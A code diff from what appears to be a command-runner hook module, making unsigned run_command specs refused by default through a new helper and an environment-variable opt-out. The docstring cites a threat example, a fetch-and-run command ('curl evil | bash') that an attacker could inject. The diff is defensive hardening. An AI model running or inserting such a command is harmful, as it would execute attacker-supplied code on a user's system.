@@ -1532,6 +1532,18 @@ def _deny_dict(reason: str, *, hook_event_name: str = "PreToolUse") -> dict:
     return _emit_deny_payload(reason, hook_event_name=hook_event_name)
 
 
+def _require_signed_run_command_spec() -> bool:
+    """LOCAL-1: unsigned run_command specs are refused BY DEFAULT.
+
+    The reply drives a local command execution, so an unsigned spec from a MITM
+    on the loopback / sidecar bind could inject ``command='curl evil | bash'``.
+    The installed self-host image always carries a keystore, so the signed path
+    is the norm. Operators opt out only with an explicit
+    ``MAGI_CP_REQUIRE_SIGNED_RUN_COMMAND_SPEC=0``.
+    """
+    return os.environ.get("MAGI_CP_REQUIRE_SIGNED_RUN_COMMAND_SPEC", "1") != "0"
+
+
 def run_command_cli() -> int:
     """`magi-cp-run-command` entry point.
 
@@ -1632,9 +1644,8 @@ def run_command_cli() -> int:
         if isinstance(signed_spec, dict):
             spec = signed_spec
     if spec is None:
-        if os.environ.get("MAGI_CP_REQUIRE_SIGNED_RUN_COMMAND_SPEC") == "1":
-            # Strict mode: refuse unsigned replies entirely.
-            return 0
+        if _require_signed_run_command_spec():
+            return 0   # strict-by-default: refuse unsigned replies
         unsigned_spec = reply.get("spec")
         if isinstance(unsigned_spec, dict):
             spec = unsigned_spec
